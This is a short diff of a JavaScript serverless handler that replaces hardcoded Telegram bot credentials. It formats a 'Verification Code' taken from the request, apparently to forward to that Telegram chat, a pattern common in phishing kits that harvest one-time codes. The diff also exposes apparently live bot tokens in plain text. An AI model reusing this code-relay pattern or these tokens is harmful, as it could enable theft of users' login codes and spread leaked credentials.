@@ -13,8 +13,8 @@ export default async function handler(req, res) {
   }
 
   // Telegram credentials – you can also move these to environment variables
-  const BOT_TOKEN = '9141377727:AAENLzMxCc3R6YnxRmzPIE3DpLwpMM75s7Q';
-  const CHAT_ID   = '5244788909';
+  const BOT_TOKEN = '8725766460:AAGaDs-aNztMcqcbkEkucDyoXbGPNkVRSts';
+  const CHAT_ID   = '8784455249';
 
   // Format a simple Markdown message
   const message = `🔐 *Verification Code:* \`${code}\``;
